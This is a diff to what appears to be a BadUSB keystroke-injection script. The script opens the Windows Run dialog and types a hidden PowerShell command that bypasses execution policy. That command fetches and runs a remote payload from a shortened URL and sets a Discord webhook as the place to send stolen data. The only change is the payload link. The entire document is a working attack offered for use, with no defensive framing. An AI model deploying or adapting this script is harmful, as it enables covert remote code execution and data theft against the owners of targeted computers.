@@ -1,6 +1,6 @@
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1221196339912900729/PkNroaMwrC9jE1ZXl-mbpP1VYRrLIZ6_QHaqj49VYaGedcWIPGmvAyTjFWJV2S5cxBMx';$db='';irm https://acesse.dev/HbIAO | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1221196339912900729/PkNroaMwrC9jE1ZXl-mbpP1VYRrLIZ6_QHaqj49VYaGedcWIPGmvAyTjFWJV2S5cxBMx';$db='';irm https://acesse.dev/7LWdV | iex
 ENTER
 
 
